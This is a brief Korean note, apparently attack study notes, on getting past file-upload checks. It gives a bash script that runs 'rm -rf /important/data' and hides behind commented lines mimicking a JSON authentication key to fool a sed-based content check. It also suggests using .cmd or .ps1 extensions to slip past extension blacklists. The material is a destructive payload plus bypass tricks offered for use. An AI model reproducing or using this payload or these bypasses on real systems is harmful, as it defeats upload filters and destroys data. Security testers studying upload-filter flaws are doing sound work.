# FILE UPLOAD 공격 우회  
  
파일의 복호화된 내용을 sed로 읽고 검사하는 경우 주석 처리로 우회 가능  
#!/bin/bash  
rm -rf /important/data  
#{  
#"key": "authentication code"  
#}  

-----------------------------------------------  
확장자가 블랙리스트 방식으로 허용될 경우  
.cmd , .ps1 등의 확장자로 우회하여 악성 파일 배포 가능  
